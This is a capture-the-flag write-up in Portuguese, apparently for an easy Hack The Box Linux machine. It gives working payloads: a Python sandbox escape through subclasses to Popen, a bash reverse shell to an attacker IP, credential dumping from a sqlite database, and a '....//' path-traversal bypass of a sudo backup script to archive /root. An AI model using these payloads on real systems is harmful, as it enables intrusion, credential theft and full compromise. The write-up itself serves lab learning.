#Difficult : Easy #OS : Linux
***
## Port Scanning
```sh
nmap 10.10.11.62 -Pn -sV -sC -A -oN scann_tcp
```
![[Pasted image 20250513200209.png]]
Temos uma aplicação rodando em um servidor python(`gunicorn`) na porta `500`, podemos acessa-la e ver a aplicação que está rodando.
****
## Foothold - Sandbox Python
![[Pasted image 20250513200815.png]]

Pelo que parece, a aplicação é uma sandbox que aceita comandos `python`, mas não permite alguns comandos, como `os` ou `import`.

Após uma breve pesquisa, achei um [post da Boiatech](https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes) sobre técnicas de `bypass` de sandboxes, uma delas é utilizando `subclasses`.
![[Pasted image 20250513202503.png]]

Primeiro enumerei quantas subclasses há nessa classe.
![[Pasted image 20250513203115.png]]

Como sei quantas subclasses existem, posso listar todas para achar algum comando útil, como o `popen`, que inicia um novo processo e nos permite interagir ele, controlando o fluxo de entrada e saída.
```python
for i in range(0,722):
    string = str("".__class__.__mro__[1].__subclasses__()[i])
    esc = "Po"+"pen"
    if esc in string:
        print(str(i) + ' - '+ string)
    else:
        print('')
```
![[Pasted image 20250513205028.png]]

Encontrei o `popen` na posição `317`, agora posso utiliza-lo para obter uma `revshell`. Mas primeiro devemos escutar uma porta para receber a shell.
```sh
nc -nvlp 4545
```

Agora podemos executar a `revshell` na aplicação.
```python
shell = ''.__class__.__mro__[1].__subclasses__()[317]
shell("bash -c 'bash -i >& /dev/tcp/10.10.x.x/4545 0>&1'", shell=True)
```

Após a conexão listo a pasta `home` do usuário para ver se a flag está aqui.
```sh
ls ~/
```
![[Pasted image 20250514163938.png]]
***
## Lateral Movement
Após entrar na máquina vejo que estou em uma pasta `app`, onde fica localizado os arquivos da aplicação. Então emito o comando `ls -R` para mapear a estrutura da pasta.
```sh
ls -R
```
![[Pasted image 20250514162651.png]]

Localizei um arquivo `database.db` que costuma ser um banco de dados `sqlite3`. Então enumerei esse arquivo, e descobri algumas credenciais.
```sh
sqlite3 ./instance/database.db ".tables"
sqlite3 ./instance/database.db "select * from user"
```
![[Pasted image 20250514162938.png]]

Como existe 2 usuários no banco de dados, verifiquei quais usuários podem logar no sistema.
```sh
cat /etc/passwd | grep /bin/bash
```
![[Pasted image 20250514163321.png]]

Apenas o usuário `martin` pode logar no sistema, então verifiquei se sua hash já foi quebrada em algum banco conhecido no `crackstation`
![[Pasted image 20250514163156.png]]

Senha quebrada, agora podemos fazer login.
```sh
ssh martin@10.10.11.62
```
![[Pasted image 20250514163747.png]]
***
## PRIV ESC
Primeira enumeração a fazer é ver nossos privilégios com `sudo -l`.
```sh
sudo -l
```
![[Pasted image 20250514171113.png]]

#### Code analysis
Podemos ver o conteúdo do script para ver o que ele faz.
```sh
cat /usr/bin/backy.sh
```

```sh
!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Pelo o que eu entendi, ele recebe um arquivo `task.json`, verifica se o `path` passado começa com `/var/` ou `/home/`, e também usa uma `regex` que retira qualquer ocorrência de `../`.

Na pasta `backup` há um arquivo `task.json` que aparentemente é o que foi usado. Podemos ver seu conteúdo também.
```sh
cat ./backups/task.json

 "destination": "/home/martin/backups/",
 "multiprocessing": true,
 "verbose_log": false,
 "directories_to_archive": [
  "/home/app-production/app"
 ],

 "exclude": [
  ".*"
 ]
}
```

Podemos modifica-lo para pegar o que tem na pasta `/root`.
```sh
 "destination": "/home/martin/",
 "multiprocessing": true,
 "verbose_log": false,
 "directories_to_archive": [
  "/var/....//root/"
 ]
}
```
#### Root flag
Agora podemos executar o comando com a nossa `task.json`.
```sh
sudo /usr/bin/backy.sh ./task.json
ls
tar -xvjf code_var_.._root_2025_May.tar.bz2
```
![[Pasted image 20250514182351.png]]

Agora que descomprimimos a `root`, podemos olhar o que há dentro.
```sh
ls ./root
```
![[Pasted image 20250514182457.png]]
***

![[Pasted image 20250514182647.png]]